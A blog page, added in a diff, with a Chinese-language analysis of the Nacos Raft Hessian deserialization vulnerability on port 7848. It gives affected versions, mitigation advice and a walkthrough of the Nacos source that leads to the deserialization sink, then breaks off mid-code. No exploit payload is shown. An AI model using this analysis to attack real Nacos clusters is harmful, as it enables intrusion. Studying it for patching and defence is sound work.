@@ -1,0 +1,704 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、漏洞描述Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。漏洞利用实际需要访问到相应端口，实际风险可控。 二、影响版本1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos 内网集群 Raft 反序列化漏洞">
+<meta property="og:url" content="http://example.com/2023/06/19/Nacos-%E5%86%85%E7%BD%91%E9%9B%86%E7%BE%A4-Raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="白给&#39;s Blog">
+<meta property="og:description" content="一、漏洞描述Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。漏洞利用实际需要访问到相应端口，实际风险可控。 二、影响版本1">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-06-19T14:51:35.000Z">
+<meta property="article:modified_time" content="2023-06-19T14:52:16.828Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Nacos 内网集群 Raft 反序列化漏洞 - 白给&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白给&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Nacos 内网集群 Raft 反序列化漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-19 22:51" pubdate>
+          2023年6月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Nacos 内网集群 Raft 反序列化漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a><strong>一、漏洞描述</strong></h1><p>Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。<br>漏洞利用实际需要访问到相应端口，实际风险可控。</p>
+<h1 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a><strong>二、影响版本</strong></h1><p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6<br>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3</p>
+<h1 id="三、漏洞详情"><a href="#三、漏洞详情" class="headerlink" title="三、漏洞详情"></a><strong>三、漏洞详情</strong></h1><h2 id="Nacos-中-Jraft-服务源码解析"><a href="#Nacos-中-Jraft-服务源码解析" class="headerlink" title="Nacos 中 Jraft 服务源码解析"></a>Nacos 中 <strong>Jraft 服务源码解析</strong></h2><p>当 Nacos 使用<strong>嵌入数据源</strong>（ -DembeddedStorage&#x3D;true，每个节点有一个数据源），以<strong>集群</strong>方式启动（-Dnacos.standalone&#x3D;false）时，使用raft协议，来保证数据一致性，并在1.4.1开始使用了sofa-jraft框架。<br>Nacos 内调用 Jraft 流程如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A concrete implementation of CP protocol: JRaft.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * &lt;pre&gt;</span><br><span class="hljs-comment"> *                                           ┌──────────────────────┐</span><br><span class="hljs-comment"> *            ┌──────────────────────┐       │                      ▼</span><br><span class="hljs-comment"> *            │   ProtocolManager    │       │        ┌───────────────────────────┐</span><br><span class="hljs-comment"> *            └──────────────────────┘       │        │for p in [LogProcessor4CP] │</span><br><span class="hljs-comment"> *                        │                  │        └───────────────────────────┘</span><br><span class="hljs-comment"> *                        ▼                  │                      │</span><br><span class="hljs-comment"> *      ┌──────────────────────────────────┐ │                      ▼</span><br><span class="hljs-comment"> *      │    discovery LogProcessor4CP     │ │             ┌─────────────────┐</span><br><span class="hljs-comment"> *      └──────────────────────────────────┘ │             │  get p.group()  │</span><br><span class="hljs-comment"> *                        │                  │             └─────────────────┘</span><br><span class="hljs-comment"> *                        ▼                  │                      │</span><br><span class="hljs-comment"> *                 ┌─────────────┐           │                      │</span><br><span class="hljs-comment"> *                 │ RaftConfig  │           │                      ▼</span><br><span class="hljs-comment"> *                 └─────────────┘           │      ┌──────────────────────────────┐</span><br><span class="hljs-comment"> *                        │                  │      │  create raft group service   │</span><br><span class="hljs-comment"> *                        ▼                  │      └──────────────────────────────┘</span><br><span class="hljs-comment"> *              ┌──────────────────┐         │</span><br><span class="hljs-comment"> *              │  JRaftProtocol   │         │</span><br><span class="hljs-comment"> *              └──────────────────┘         │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                     init()                │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        ▼                  │</span><br><span class="hljs-comment"> *               ┌─────────────────┐         │</span><br><span class="hljs-comment"> *               │   JRaftServer   │         │</span><br><span class="hljs-comment"> *               └─────────────────┘         │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        ▼                  │</span><br><span class="hljs-comment"> *             ┌────────────────────┐        │</span><br><span class="hljs-comment"> *             │JRaftServer.start() │        │</span><br><span class="hljs-comment"> *             └────────────────────┘        │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        └──────────────────┘</span><br><span class="hljs-comment"> * &lt;/pre&gt;</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="ProtocolManager"><a href="#ProtocolManager" class="headerlink" title="ProtocolManager"></a>ProtocolManager</h3><p>com.alibaba.nacos.core.distributed.ProtocolManager 构造方法如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProtocolManager</span><span class="hljs-params">(ServerMemberManager memberManager)</span> &#123;<br>    <span class="hljs-built_in">this</span>.memberManager = memberManager;<br>    NotifyCenter.registerSubscriber(<span class="hljs-built_in">this</span>);<br>&#125;<br>    <br></code></pre></td></tr></table></figure>
+
+<p>此处 ServerMemberManager 如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerMemberManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationListener</span>&lt;WebServerInitializedEvent&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">NacosAsyncRestTemplate</span> <span class="hljs-variable">asyncRestTemplate</span> <span class="hljs-operator">=</span> HttpClientBeanHolder<br>            .getNacosAsyncRestTemplate(Loggers.CORE);<br><br>    <span class="hljs-comment">//默认服务端口未 8848</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">8848</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SERVER_PORT_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SPRING_MANAGEMENT_CONTEXT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;management&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MEMBER_CHANGE_EVENT_QUEUE_SIZE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nacos.member-change-event.queue.size&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_MEMBER_CHANGE_EVENT_QUEUE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">128</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isUseAddressServer</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">DEFAULT_TASK_DELAY_TIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">5_000L</span>;<br><br>    ...<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerMemberManager</span><span class="hljs-params">(ServletContext servletContext)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">this</span>.serverList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentSkipListMap</span>&lt;&gt;();<br>        EnvUtil.setContextPath(servletContext.getContextPath());<br>        <span class="hljs-comment">//调用init()</span><br>        init();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NacosException &#123;<br>        Loggers.CORE.info(<span class="hljs-string">&quot;Nacos-related cluster resource initialization&quot;</span>);<br>        <span class="hljs-built_in">this</span>.port = EnvUtil.getProperty(SERVER_PORT_PROPERTY, Integer.class, DEFAULT_SERVER_PORT);<br>        <span class="hljs-built_in">this</span>.localAddress = InetUtils.getSelfIP() + <span class="hljs-string">&quot;:&quot;</span> + port;<br>        <span class="hljs-comment">//调用至 MemberUtil#singleParse(this.localAddress);</span><br>        <span class="hljs-built_in">this</span>.self = MemberUtil.singleParse(<span class="hljs-built_in">this</span>.localAddress);<br>        <span class="hljs-built_in">this</span>.self.setExtendVal(MemberMetaDataConstants.VERSION, VersionUtils.version);<br>        ...<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>MemberUtil#singleParse(this.localAddress)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_RAFT_OFFSET_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Member <span class="hljs-title function_">singleParse</span><span class="hljs-params">(String member)</span> &#123;<br>    <span class="hljs-comment">// Nacos default port is 8848</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">defaultPort</span> <span class="hljs-operator">=</span> EnvUtil.getProperty(SERVER_PORT_PROPERTY, Integer.class, DEFAULT_SERVER_PORT);<br>    <span class="hljs-comment">// Set the default Raft port information for securit</span><br>    <br>    <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> member;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> defaultPort;<br>    String[] info = InternetAddressUtil.splitIPPortStr(address);<br>    <span class="hljs-keyword">if</span> (info.length &gt; <span class="hljs-number">1</span>) &#123;<br>        address = info[<span class="hljs-number">0</span>];<br>        port = Integer.parseInt(info[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-type">Member</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> Member.builder().ip(address).port(port).state(NodeState.UP).build();<br>    Map&lt;String, Object&gt; extendInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">4</span>);<br>    <span class="hljs-comment">// The Raft Port information needs to be set by default</span><br>	<span class="hljs-comment">//Jraft 默认端口7848</span><br>    extendInfo.put(MemberMetaDataConstants.RAFT_PORT, String.valueOf(calculateRaftPort(target)));<br>    extendInfo.put(MemberMetaDataConstants.READY_TO_UPGRADE, <span class="hljs-literal">true</span>);<br>    target.setExtendInfo(extendInfo);<br>    <span class="hljs-keyword">return</span> target;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateRaftPort</span><span class="hljs-params">(Member member)</span> &#123;<br>	<span class="hljs-comment">//端口为默认端口 -1000 即 7848</span><br>    <span class="hljs-keyword">return</span> member.getPort() - DEFAULT_RAFT_OFFSET_PORT;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="JRaftProtocol"><a href="#JRaftProtocol" class="headerlink" title="JRaftProtocol"></a>JRaftProtocol</h3><p>com.alibaba.nacos.core.distributed.raft.JRaftProtocol</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRaftProtocol</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractConsistencyProtocol</span>&lt;RaftConfig, RequestProcessor4CP&gt;<br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CPProtocol</span>&lt;RaftConfig, RequestProcessor4CP&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">initialized</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">shutdowned</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);<br><br>    <span class="hljs-comment">//此处默认为 Hessian 反序列化</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Serializer</span> <span class="hljs-variable">serializer</span> <span class="hljs-operator">=</span> SerializeFactory.getDefault();<br>    <br>    <span class="hljs-keyword">private</span> RaftConfig raftConfig;<br>    <br>    <span class="hljs-keyword">private</span> JRaftServer raftServer;<br>    <br>    <span class="hljs-keyword">private</span> JRaftMaintainService jRaftMaintainService;<br>    <br>    <span class="hljs-keyword">private</span> ServerMemberManager memberManager;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRaftProtocol</span><span class="hljs-params">(ServerMemberManager memberManager)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">this</span>.memberManager = memberManager;<br>        <span class="hljs-built_in">this</span>.raftServer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftServer</span>();<br>        <span class="hljs-built_in">this</span>.jRaftMaintainService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftMaintainService</span>(raftServer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>com.alibaba.nacos.consistency.SerializeFactory#getDefault()  获取到HessianSerializer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeFactory</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">HESSIAN_INDEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hessian&quot;</span>.toLowerCase();<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, Serializer&gt; SERIALIZER_MAP = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">4</span>);<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">defaultSerializer</span> <span class="hljs-operator">=</span> HESSIAN_INDEX;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-type">Serializer</span> <span class="hljs-variable">serializer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianSerializer</span>();<br>        SERIALIZER_MAP.put(HESSIAN_INDEX, serializer);<br>        <span class="hljs-keyword">for</span> (Serializer item : NacosServiceLoader.load(Serializer.class)) &#123;<br>            SERIALIZER_MAP.put(item.name().toLowerCase(), item);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Serializer <span class="hljs-title function_">getDefault</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> SERIALIZER_MAP.get(defaultSerializer);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Serializer <span class="hljs-title function_">getSerializer</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-keyword">return</span> SERIALIZER_MAP.get(type.toLowerCase());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>com.alibaba.nacos.consistency.serialize.HessianSerializer   此处直接为 Hessian 序列化及反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.Serializer;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> 